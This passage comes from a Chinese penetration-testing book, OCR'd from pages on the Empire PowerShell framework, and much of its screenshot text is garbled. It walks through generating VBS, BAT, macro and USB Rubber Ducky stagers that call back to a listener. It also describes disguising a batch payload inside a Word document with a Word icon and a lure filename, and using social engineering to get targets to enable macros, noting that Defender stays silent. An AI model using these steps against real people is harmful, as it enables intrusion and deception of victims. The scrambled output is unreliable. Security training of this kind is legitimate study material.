就相当于Metasploit的会话scssions，如图6-73所示。
---
## Page 318
第6章PowerShell攻击指南299
pgare: Lis
ast See
207-11-21:00:3
200.6
10-3
HetL/2428
5/0.0
t
图6-73查看上线的主机
此时代理Name会取一个随机的名字，可使用rename
命令来修改，这里输入renameL9FPTXV6USA，如图6-74所示。
LastS
图6-74更改主机名称
3.launcher_vbs 木马
要想设置launcher_vbs木马，首先要输入usestager windows/launcher_vbs，然后输
入info命令来查看详细参数，如图6-75所示。
epirei tist
1B5 Laung
Fegsined
Taloe
/tsp/laonc
ser-its
otncate
False
False
bfus
Fale
e-efvscatio
图6-75查看详细参数
使用以下命令设置Listener的参数并运行，默认会在tmp文件夹下生成launcher.vbs，
---
## Page 319
300Web安全攻防：渗透测试实战指南
如图6-76所示。
Set 1istener shuteer
Execute
（Empire:stager/windows/launcher_vbs）>set Listener shuteer
[*]Stager output written out to:/tup/launcher.vbs
(Enpire: stager/windous/Launcher_vbs) >[
图6-76生成VBS木马
最后输入back命令回到Listener下开始监听，将生成的这个launcher.vbs在目标机
上打开，就会得到这个主机的权限，这里使用的虚拟机是Windows10的64位旗舰版，
安装有系统自带的Defender，运行后，launcher_vbs木马成功上线，如图6-77所示。
Defender没有出现任何提示。
(Empire:s
(Empire： Listeners）>[+]Initial agent E6Lxus from 103.o202 now active (Slack)
pire:Listeners)>
图6-77反弹成功
如果要生成PowerShell代码，设置完Listener后不用输入exccute，直接输入back，
然后输入launcher powershell shuteer即可，如图6-78所示。
AM
图6-78执行PowerShell代码
4.launcher_bat木马
要想设置launcher_bat木马，首先要输入usestagcr windows/launcher_bat的命令，
然后输入info命令查看详细参数，如图6-79所示。
---
## Page 320
第6章PowerShell攻击指南301
e： BAT Lache
(epere
scription:
esa self-deleting .bat la
her fo
taons:
Reguirod
value
Descriptisn
Lismer
Triee
/tap/launcher.bat Fie to e
Cotuscate
tbat1
False
Fatse
图6-79查看详细参数
使用以下命令设置Listener的参数并输入execute命令运行，默认会在tmp文件夹下
生成launcher.bat，如图6-80所示。
Set 1istener shuteer
Execute
(Empire:stager/windous/laumcher_bat)>set Listener shuteer
[°] Stager output written out to:/tap/launcher.bat
(Enpire:stager/windows/launcher _bat)>
图6-80生成BAT木马
输入back命令回到listeners下开始监听，然后将生成的这个launcher.bat在目标机
上打开，就会得到这个主机的权限，可以看到，在虚拟机运行后，BAT木马已经成功
上线了，如图6-81所示。
[Espirei Listeeers) > [] Initialt ageet 3st5G17 fron ]
tpire: （ists）>aets
]Active agets:
Last Seen
LngDteut 
Rachise tase
usertaet
Precess
Delay
...
20..117.10210__117_10210__17_2ipp
hell/as9
5/0-0
图6-81反弹成功
为了增加迷惑性，也可以将该批处理文件插入一个office文件中，这里随便找个
---
## Page 321
302Web安全攻防：渗透测试实战指南
单击“浏览”按钮，并选择刚才生成的批处理文件，然后勾选“显示为图标”，最后
单击“更改图标”按钮来更改一个更具诱惑性的图标，如图6-82所示。
徐焱
“
图6-82插入新对象
在“更改图标”界面里，我们可以选择一个图标，这里建议使用微软的Excel、
Word或PowerPoint图标，这里使用了Word的图标，并且更改文件的名称为研究成果，
扩展名改为doc。单击“确定”按钮后，该对象就会插入Word文件中，如图6-83所示。
个人员分：
2002年接触同经安全，对Metaipot和内同冰连有波
等余志和票体发过多控术文章，00：8946723，
研究成果：
图6-83插入Word文件
接着在listeners下监听，然后将该Word文件发给目标，一旦该Word在目标机上被
打开，并运行了内嵌的批处理文件，就会得到这个主机的权限，这里使用的虚拟机
是Windows10的64位旗舰版，安装有系统自带的Defender，Word文件运行后，BAT
木马成功上线，Defender没有任何提示，360安全卫士会报告发现宏病毒，如图6-84
所示。
sIlIntiala
KEAG8Cc1RY from 192.168.31.186now active
图6-84反弹成功
---
## Page 322
第6章PowerShell攻击指南303
5.Macro木马
要想设置Macro木马，首先需要输入usestager windows/macro命令，然后输入info
命令查看详细参数，如图6-85所示。
(Empa
0:Racro
anoffice
option
Nane
Yatue
Descriptisn
图6-85查看详细参数
这里使用以下命令设置Listener的参数并输入execute命令使其运行，如图6-86所
示。
Set listener shuteer
Execute
(Empire:stager/windows/macro)> set Listener shuteer
[*]Stager output written out to:/tp/maro
ire:st
图6-86生成Macro木马
默认会生成一个宏，储存在/tmp/macro文件中，如图6-87所示。
③ Recent
Hem
Op-n
6 Sua
open(
图6-87查看tmp目录
---
## Page 323
304Web安全政防：渗透测试实战指南
然后需要将生成的宏添加到一个Office文档里面，这里打开一个Word文件，单击
然后单击“创建”按钮，如图6-88所示。
图6-88创建宏
单击“创建”按钮后会弹出VB编辑界面，将原来的代码删除，把生成的宏复制
进去，另存为“Word97-2003文档（*.doc）”文件，如图6-89和图6-90所示。
M-
68-9
复制宏代码
文排名
个人H8-80.doo
文（.do
v
图6-90另存为文档
---
## Page 324
第6章PowerShell攻击指南305
最后将这个修改过的Word拷到目标机上执行，打开后会提示一个安全警告，这
里需要使用一些社会工程学的策略，诱导目标单击“启用内容”按钮，如图6-91所示。
 - 01
开人
个A-8Bec [I9] - Moeh Wo
A
A
图6-91Word的安全警告
这里单击“启用内容”按钮，可以看到在监听界面下面，目标机已经顺利上线
了。在实际情况下，360安全卫士会报告发现宏病毒，如图6-92所示。
mers)>[+]nitial
Enpire: Listeners) > agents
]Active agents:
Name
Lang Internal IP
Machine Nase
Usemane
Precess
oelay
2017-11-23 15:42:29
PS
192.168.1.1790ESKTOP-20THGOM DESKTOP-20T
rshell/973
5/0.
图6-92反弹成功
如果要删除该主机，可以使用kil或者remove命令，如图6-93所示。
[*] Active agents:
d [eueubue
Rachine Nane
Usermaae
Process
Delay
25-3123 16:13:43
192.168.1.179DESKTOP-20TNGOM DESKTOP-2DTMG0Mshutpo
vershell/s80
5/0.0
(Eapires
agents)>kil1 9Y565318
Eapire:
ge
ets cerrently registered
nts}>list
图6-93删除目标主机
---
## Page 325
306Web安全政防：渗造测试实战指南
6.Ducky
Empire也支持Ducky模块，也就是我们常说的“小黄鸭”，输入usestager
windows/ducky命令，然后输入info命令查看详细参数，如图6-94所示。
rs)>
ducky）info
he：DuckyLauncher
scription:
stage0 laur
ptions
Required
value
Description
OutFile
displayed on the screen.
cript to.oth
图6-94查看详细参数
这里只要设置Listener参数，就可以生成用于烧制的代码，如图6-95所示。
/dacky)>set LIst
围6-95生成代码
将该代码烧至“小黄鸭”中，插入目标用户的计算机，就可以反弹回来。具体
操作流程可以参考这篇文章—《利用USBRUBBERDUCKY（USB橡皮鸭）在目
标机器上启动Empire或Meterpreter会话》（http://www.freebuf.com/geek/141839.html）。
6.3.5连接主机及基本使用
目标主机反弹成功以后，可以使用agents命令列出当前已连接的主机，这里要注
意带有（*）的是已提权成功的主机，如图6-96所示。
---
## Page 326
第6章PowerShell攻指南307
Process
belay
Last Seen
102.16:311500716
图6-96列出已连接的主机
然后使用interact命令连接主机，可以使用Tab键补全主机的名称，连接成功后输
入help命令即可列出所有的命令，如图6-97所示
lads
Cokteest
te recess.Ex.inectshellde
or
amit
the tinit e lost ageet detectis
tisPG.
revers.tokes
ask
(et gu（：00-17
图6-97查看帮助
可以看到主机的功能相当强大，基本可以和Metasploit媲美，更为强大的是兼容
Windows、Linux和Metasploit的部分常用命令，使用起来上手相当快，如图6-98所示。
---
## Page 327
308Wcb安全政防：渗透测试实战指南
Path
USA] >getuid
NIT AUTHORITYUNETWORK SERVICE
Enpire: UsAl >
(Empire
Handles
NPH(K)
PM(K)
WS(K) WW(H)CPU(S)
60.112428 powe
Id Processtiane
365
2
63536
66356
566
图6-98使用Linux命令
输入helpagentcmds可以看到可供使用的常用命令，如图6-99所示。
(Empire:UsA)>help agentcmds
[*]Available opsec-safe agent comands:
ls,dir,m.del,cp.copy.pd.cat，cd.mkdir.
reboot，restart,shutdown,ps.tasklist,getpid,
nmdir.mv.move.
whoami.getuid,hostname